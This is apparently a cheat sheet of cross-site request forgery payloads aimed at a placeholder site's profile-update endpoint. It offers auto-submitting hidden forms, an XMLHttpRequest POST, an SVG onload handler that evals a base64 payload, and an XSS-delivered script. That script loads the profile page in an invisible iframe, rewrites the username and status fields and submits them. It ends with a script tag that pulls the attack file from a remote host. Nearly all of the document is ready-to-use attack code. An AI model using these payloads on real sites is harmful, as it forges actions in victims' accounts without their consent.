# csfr-hacking

### Basic form
```html
<form name="pls" action="https://xxx.fr/index.php?action=profile" method="post">
<div class="form-group">
		<label>Username:</label>
		<input name="username" value="devsid" type="text">
		</div>
		<br>		
		<div class="form-group">
		<label>Status:</label>
		<input name="status"checked="checked" type="checkbox">
		</div>
		<br>	
		<button type="submit">Submit</button>
</form>
<script language="javascript">document.pls.submit();</script>
```

### Basic form
```html
<html><body>

  <form name="csrf" action="https://xxx.fr/index.php?action=profile" method="POST">
    <input type="hidden" name="username" value="aaa">
    <input type="hidden" name="status" value="on">
  </form>

  <script type="text/javascript">document.csrf.submit();</script>
</body></html>
```

### Form using XMLHttpRequest
```html
<script>
var formData = new FormData();
formData.append("username", "test");
formData.append("status", "on");
var request = new XMLHttpRequest();
request.open("POST", "https://xxx.fr/index.php?action=profile");
request.send(formData);
</script>

### Encoded payload 
```js
<svg/onload=eval(atob('<base 64 payload>'));//>
```

### You can also host a script and then call it if the target is XSS vulnerable
```js
// On charge le formulaire dans une frame invisible
document.write('<iframe id=\"iframe\" src=\"https://xxx.fr/index.php?action=profile\" width="0" height="0" onload=\"pwn()\"></iframe>');

//On modifie les champs à notre guise
function pwn() {
        document.getElementById('iframe').contentDocument.forms[0].username.value='titi'; 
        document.getElementById('iframe').contentDocument.forms[0].status.checked=true;
        document.getElementById('iframe').contentDocument.forms[0].status.disabled=false
        document.getElementById('iframe').contentDocument.forms[0].submit();
}
```

### Load
```js
<script src="http://XXXXXXX/csrf.js"></script>
```